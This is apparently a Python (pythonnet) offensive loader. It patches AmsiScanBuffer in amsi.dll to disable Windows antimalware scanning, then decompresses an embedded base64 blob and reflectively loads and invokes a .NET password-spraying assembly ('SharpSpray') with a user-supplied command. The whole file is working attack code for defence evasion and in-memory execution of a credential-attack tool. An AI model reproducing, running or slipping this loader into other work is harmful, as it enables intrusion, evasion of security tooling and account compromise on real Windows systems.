import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpSpray.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()